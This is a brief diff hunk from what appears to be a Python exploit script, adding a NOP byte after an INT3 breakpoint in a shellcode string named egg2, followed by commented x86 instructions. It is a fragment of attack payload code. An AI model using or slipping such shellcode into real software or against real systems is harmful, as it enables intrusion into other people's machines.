@@ -54,6 +54,7 @@ egg1 = (
 
 egg2 = (
 "\xCC"  # Int 3
+"\x90"
 "\x31\xdb"                            # XOR EBX, EBX
 "\x53"                                # PUSH EBX
 "\x53"                                # PUSH EBX
